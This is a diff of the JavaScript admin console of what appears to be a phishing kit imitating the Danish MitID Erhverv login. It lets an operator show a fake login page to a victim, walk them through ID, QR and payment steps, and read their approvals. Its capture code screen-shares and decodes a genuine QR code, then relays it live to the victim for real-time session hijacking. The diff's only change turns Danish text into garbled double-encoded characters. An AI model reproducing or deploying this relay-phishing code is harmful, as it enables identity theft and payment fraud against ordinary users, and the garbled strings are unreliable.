@@ -1,13 +1,13 @@
-/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-   admin.js â€” simpel Ã©n-fane konsol (MitID Erhverv-stil)
-   Kontrol-trin Â· Egen handling Â· QR/tekster Â· Capture Â· Telegram Â· Indstillinger
-   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
+/* Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+   admin.js Ã¢â‚¬â€ simpel ÃƒÂ©n-fane konsol (MitID Erhverv-stil)
+   Kontrol-trin Ã‚Â· Egen handling Ã‚Â· QR/tekster Ã‚Â· Capture Ã‚Â· Telegram Ã‚Â· Indstillinger
+   Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â */
 
 let state = null;
 let adminPassword = sessionStorage.getItem('adminPassword') || '';
 
 function fmtTime(d){
-  if(!d) return 'â€”';
+  if(!d) return 'Ã¢â‚¬â€';
   const dt = new Date(d);
   return dt.toLocaleDateString('da-DK') + ' ' + dt.toLocaleTimeString('da-DK',{hour:'2-digit',minute:'2-digit'});
 }
@@ -75,7 +75,7 @@ async function doVerify(){
     showApp();
   } else {
     const msg = document.getElementById('loginCodeMsg');
-    if (msg) msg.textContent = data.error || 'Forkert kode â€” prÃ¸v igen:';
+    if (msg) msg.textContent = data.error || 'Forkert kode Ã¢â‚¬â€ prÃƒÂ¸v igen:';
     const inp = document.getElementById('loginCode');
     inp.value = '';
     inp.focus();
@@ -97,7 +97,7 @@ async function showApp(){
   loadStats();
 }
 
-// auto-login med gemt adgangskode (kun hvis 2FA ikke krÃ¦ver ny kode)
+// auto-login med gemt adgangskode (kun hvis 2FA ikke krÃƒÂ¦ver ny kode)
 if(adminPassword){
   fetch('/api/login', {
     method:'POST',
@@ -115,7 +115,7 @@ function connectSocket(){
     const socket = io();
     socket.on('admin-state-update', (s) => { state = s; render(); });
   } catch(e) {
-    // socket.io utilgÃ¦ngelig â€” poll-opsvinget herunder dÃ¦kker
+    // socket.io utilgÃƒÂ¦ngelig Ã¢â‚¬â€ poll-opsvinget herunder dÃƒÂ¦kker
   }
 }
 
@@ -147,24 +147,24 @@ function render(){
   const offlineMsg = document.getElementById('previewOfflineMsg');
 
   if(kioskDot){
-    kioskDot.textContent = 'SESSION Â· ' + (state.sessionId || 'â€”');
+    kioskDot.textContent = 'SESSION Ã‚Â· ' + (state.sessionId || 'Ã¢â‚¬â€');
     kioskDot.classList.toggle('live', !!state.live);
   }
 
   if(state.live){
     dot.classList.add('live');
-    statusText.textContent = 'Live â€” vises pÃ¥ kundesiden';
-    toggle.textContent = 'SÃ†T OFFLINE';
+    statusText.textContent = 'Live Ã¢â‚¬â€ vises pÃƒÂ¥ kundesiden';
+    toggle.textContent = 'SÃƒâ€ T OFFLINE';
     toggle.classList.add('is-on');
     if(qrBox) qrBox.classList.add('on');
     if(offlineMsg) offlineMsg.style.display = 'none';
-    document.getElementById('previewTitle').textContent = state.title || 'Log pÃ¥ hos MitID Erhverv';
+    document.getElementById('previewTitle').textContent = state.title || 'Log pÃƒÂ¥ hos MitID Erhverv';
     document.getElementById('previewMsg').textContent = state.message || '';
     renderQR();
   } else {
     dot.classList.remove('live');
-    statusText.textContent = 'Offline â€” intet vises';
-    toggle.textContent = 'SÃ†T LIVE';
+    statusText.textContent = 'Offline Ã¢â‚¬â€ intet vises';
+    toggle.textContent = 'SÃƒâ€ T LIVE';
     toggle.classList.remove('is-on');
     if(qrBox) qrBox.classList.remove('on');
     if(offlineMsg) offlineMsg.style.display = 'block';
@@ -217,7 +217,7 @@ function flashSave(id){
   setTimeout(()=>el.classList.remove('show'), 1800);
 }
 
-// --- Live/QR-mÃ¥l ---
+// --- Live/QR-mÃƒÂ¥l ---
 document.getElementById('liveToggle').addEventListener('click', async ()=>{
   state.live = !state.live;
   render();
@@ -275,9 +275,9 @@ function escapeHtml(str){
   return div.innerHTML;
 }
 
-/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-   FLOW-KNAPPER â€” kundens trin
-   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
+/* Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+   FLOW-KNAPPER Ã¢â‚¬â€ kundens trin
+   Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â */
 const FLOW_LABELS = { brugerid: 'Bruger-ID', scan: 'Vis QR', betaling: 'Betaling', annuller: 'Annullering', wait: 'Venter', approved: 'Godkendt' };
 
 function renderFlow(){
@@ -322,7 +322,7 @@ function renderFlow(){
   if (svarEl) {
     const r = state.actionResponse;
     if (r && Date.now() - r.at < 10 * 60 * 1000) {
-      const label = r.response === 'ok' ? 'âœ… Kunden har GODKENDT' : 'âŒ Kunden har ANNULLERET';
+      const label = r.response === 'ok' ? 'Ã¢Å“â€¦ Kunden har GODKENDT' : 'Ã¢ÂÅ’ Kunden har ANNULLERET';
       svarEl.textContent = label + ' (' + fmtTime(r.at) + ')';
       svarEl.className = 'action-svar show ' + (r.response === 'ok' ? 'ok' : 'cancel');
     } else {
@@ -378,9 +378,9 @@ document.addEventListener('click', function(e){
   if(e.target && e.target.id === 'tekstSendBtn') tekstSendClick();
 });
 
-/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+/* Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
    ROTATION (fast kort under Indstillinger)
-   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
+   Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â */
 function injectRotateUI(){
   if(document.getElementById('rotateToggle')) return;
   const mount = document.getElementById('rotateMount');
@@ -388,8 +388,8 @@ function injectRotateUI(){
   const c = document.createElement('div');
   c.innerHTML = [
     '<h2 style="margin:0 0 4px;">Automatisk rotation</h2>',
-    '<p class="sub">Skift QR til ny session automatisk hvert X sekunder â€” gamle screenshots holder ikke.</p>',
-    '<div class="status-row"><span class="dot" id="rotateDot"></span><span class="status-text" id="rotateStatusText">SlÃ¥et fra</span><button class="toggle-btn" id="rotateToggle">SLÃ… TIL</button></div>',
+    '<p class="sub">Skift QR til ny session automatisk hvert X sekunder Ã¢â‚¬â€ gamle screenshots holder ikke.</p>',
+    '<div class="status-row"><span class="dot" id="rotateDot"></span><span class="status-text" id="rotateStatusText">SlÃƒÂ¥et fra</span><button class="toggle-btn" id="rotateToggle">SLÃƒâ€¦ TIL</button></div>',
     '<label for="rotateInterval">Sekunder</label>',
     '<input type="number" id="rotateInterval" min="3" step="1" placeholder="15">',
     '<div class="btn-row"><button class="btn-primary" id="saveRotateBtn">GEM</button><span class="save-msg" id="rotateSaveMsg">Gemt</span></div>'
@@ -420,9 +420,9 @@ function renderRotateUI(){
   const d = document.getElementById('rotateDot');
   if(!d) return;
   d.classList.toggle('live', !!r.enabled);
-  document.getElementById('rotateStatusText').textContent = r.enabled ? ('Roterer hvert ' + r.intervalSeconds + 's') : 'SlÃ¥et fra';
+  document.getElementById('rotateStatusText').textContent = r.enabled ? ('Roterer hvert ' + r.intervalSeconds + 's') : 'SlÃƒÂ¥et fra';
   const t = document.getElementById('rotateToggle');
-  t.textContent = r.enabled ? 'SLÃ… FRA' : 'SLÃ… TIL';
+  t.textContent = r.enabled ? 'SLÃƒâ€¦ FRA' : 'SLÃƒâ€¦ TIL';
   t.classList.toggle('is-on', !!r.enabled);
   const e = document.getElementById('rotateInterval');
   if(document.activeElement !== e) e.value = r.intervalSeconds || 15;
@@ -433,10 +433,10 @@ document.addEventListener('click', function(e){
   if(e.target && e.target.id === 'saveRotateBtn') rotateSaveClick();
 });
 
-/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-   CAPTURE â€” skÃ¦rmdeling (hurtig pipeline: 110ms dekodning,
-   400ms debounce, Ã¸jeblikkelig socket-push til kunden)
-   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
+/* Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+   CAPTURE Ã¢â‚¬â€ skÃƒÂ¦rmdeling (hurtig pipeline: 110ms dekodning,
+   400ms debounce, ÃƒÂ¸jeblikkelig socket-push til kunden)
+   Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â */
 let captureStream = null;
 let captureScanning = false;
 let captureRafId = null;
@@ -458,7 +458,7 @@ async function startScreenShare(){
     // MAKS HASTIGHED: bed om 30fps fra kilden (browseren leverer det den kan)
     captureStream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: { ideal: 30 } }, audio: false });
   } catch(e) {
-    showCaptureErr('Kunne ikke starte skÃ¦rmdeling. VÃ¦lg det vindue hvor QR-koden vises, og prÃ¸v igen.');
+    showCaptureErr('Kunne ikke starte skÃƒÂ¦rmdeling. VÃƒÂ¦lg det vindue hvor QR-koden vises, og prÃƒÂ¸v igen.');
     return;
   }
   video.srcObject = captureStream;
@@ -468,7 +468,7 @@ async function startScreenShare(){
   document.getElementById('screenPlaceholder').style.display = 'none';
   document.getElementById('captureStartBtn').style.display = 'none';
   document.getElementById('captureStopBtn').style.display = 'inline-flex';
-  setCaptureStatus(true, 'SÃ¸ger efter QR-kode ...');
+  setCaptureStatus(true, 'SÃƒÂ¸ger efter QR-kode ...');
 
   captureScanning = true;
   captureScanLoop();
@@ -486,16 +486,16 @@ function stopScreenShare(){
   if(ph) ph.style.display = 'flex';
   document.getElementById('captureStartBtn').style.display = 'inline-flex';
   document.getElementById('captureStopBtn').style.display = 'none';
-  setCaptureStatus(false, 'SkÃ¦rmdeling stoppet');
+  setCaptureStatus(false, 'SkÃƒÂ¦rmdeling stoppet');
 }
 
 function captureScanLoop(){
   if(!captureScanning) return;
   const video = document.getElementById('screenVideo');
-  // MAKS HASTIGHED: adaptiv dekodning â€” kÃ¸r hurtigst muligt men uden at spilde
-  // CPU: 60ms interval (â‰ˆ16 scans/sek), nedskaleret til max 800px for skarphed.
-  // setTimeout i stedet for requestAnimationFrame: virker ogsÃ¥ nÃ¥r fanen er i
-  // baggrunden (RAF pauser), sÃ¥ capture altid kÃ¸rer.
+  // MAKS HASTIGHED: adaptiv dekodning Ã¢â‚¬â€ kÃƒÂ¸r hurtigst muligt men uden at spilde
+  // CPU: 60ms interval (Ã¢â€°Ë†16 scans/sek), nedskaleret til max 800px for skarphed.
+  // setTimeout i stedet for requestAnimationFrame: virker ogsÃƒÂ¥ nÃƒÂ¥r fanen er i
+  // baggrunden (RAF pauser), sÃƒÂ¥ capture altid kÃƒÂ¸rer.
   const now = performance.now();
   if(video && video.readyState === video.HAVE_ENOUGH_DATA && now - captureLastScanAt >= 60){
     const w = video.videoWidth, h = video.videoHeight;
@@ -520,10 +520,10 @@ function captureScanLoop(){
 function onCaptureDecoded(value){
   const readEl = document.getElementById('captureReadValue');
   if(readEl) readEl.value = value;
-  setCaptureStatus(true, 'Kode aflÃ¦st');
+  setCaptureStatus(true, 'Kode aflÃƒÂ¦st');
   if(!capturePushEnabled) return;
   const now = Date.now();
-  // HURTIGHED: debounce 250ms â€” nye koder nÃ¥r kunden hurtigst muligt
+  // HURTIGHED: debounce 250ms Ã¢â‚¬â€ nye koder nÃƒÂ¥r kunden hurtigst muligt
   if(value === captureLastPushed && now - captureLastPushAt < 250) return;
   captureLastPushed = value;
   captureLastPushAt = now;
@@ -538,12 +538,12 @@ async function pushCaptureToDisplay(value){
       body: JSON.stringify({ target: value })
     });
     if(res.ok){
-      setCaptureStatus(true, 'Sendt til kundeside âœ“');
+      setCaptureStatus(true, 'Sendt til kundeside Ã¢Å“â€œ');
     } else {
       showCaptureErr('Kunne ikke sende til kundesiden. Er du stadig logget ind?');
     }
   }catch(e){
-    showCaptureErr('NetvÃ¦rksfejl ved afsendelse til kundesiden.');
+    showCaptureErr('NetvÃƒÂ¦rksfejl ved afsendelse til kundesiden.');
   }
 }
 
@@ -553,7 +553,7 @@ function toggleCapturePush(){
   const statusEl = document.getElementById('capturePushStatus');
   if(toggleBtn) toggleBtn.textContent = capturePushEnabled ? 'SEND TIL KUNDESIDE: TIL' : 'SEND TIL KUNDESIDE: FRA';
   if(statusEl) statusEl.textContent = capturePushEnabled
-    ? 'Sender aflÃ¦st kode live til kundesiden â€” opdaterer Ã¸jeblikkeligt'
+    ? 'Sender aflÃƒÂ¦st kode live til kundesiden Ã¢â‚¬â€ opdaterer ÃƒÂ¸jeblikkeligt'
     : 'Sender ikke til kundesiden';
   if(capturePushEnabled && captureLastPushed === null){
     const cur = document.getElementById('captureReadValue').value;
@@ -587,7 +587,7 @@ document.getElementById('captureAutoToggle').addEventListener('click', captureTo
 
 async function captureFetchNow(){
   const url = document.getElementById('captureSourceUrl').value.trim();
-  if(!url){ showCaptureUrlErr('IndsÃ¦t en URL fÃ¸rst.'); return; }
+  if(!url){ showCaptureUrlErr('IndsÃƒÂ¦t en URL fÃƒÂ¸rst.'); return; }
   clearCaptureUrlErr();
   const btn = document.getElementById('captureFetchNowBtn');
   const original = btn.textContent;
@@ -604,7 +604,7 @@ async function captureFetchNow(){
       showCaptureUrlErr(data.error || 'Kunne ikke hente QR-koden.');
     }
   }catch(e){
-    showCaptureUrlErr('NetvÃ¦rksfejl ved hentning.');
+    showCaptureUrlErr('NetvÃƒÂ¦rksfejl ved hentning.');
   }finally{
     btn.textContent = original;
     btn.disabled = false;
@@ -618,9 +618,9 @@ async function captureSaveUrl(){
 
 async function captureToggleAuto(){
   const url = document.getElementById('captureSourceUrl').value.trim();
-  if(!url){ showCaptureUrlErr('IndsÃ¦t og gem en URL, fÃ¸r du slÃ¥r automatisk opdatering til.'); return; }
+  if(!url){ showCaptureUrlErr('IndsÃƒÂ¦t og gem en URL, fÃƒÂ¸r du slÃƒÂ¥r automatisk opdatering til.'); return; }
   const toggleBtn = document.getElementById('captureAutoToggle');
-  const turningOn = ['SlÃ¥ til','SLÃ… TIL','Slaa til'].includes(toggleBtn.textContent.trim());
+  const turningOn = ['SlÃƒÂ¥ til','SLÃƒâ€¦ TIL','Slaa til'].includes(toggleBtn.textContent.trim());
   await apiPost('/api/capture-settings', { sourceUrl: url, enabled: turningOn });
   state = await apiGet('/api/state');
   render();
@@ -634,7 +634,7 @@ function renderCaptureUrlState(){
 
   const toggleBtn = document.getElementById('captureAutoToggle');
   if(toggleBtn){
-    toggleBtn.textContent = c.enabled ? 'SLÃ… FRA' : 'SLÃ… TIL';
+    toggleBtn.textContent = c.enabled ? 'SLÃƒâ€¦ FRA' : 'SLÃƒâ€¦ TIL';
     toggleBtn.classList.toggle('is-on', !!c.enabled);
   }
 
@@ -657,9 +657,9 @@ function clearCaptureUrlErr(){
   if(el) el.textContent = '';
 }
 
-/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+/* Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
    TELEGRAM-NOTIFIKATIONER
-   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
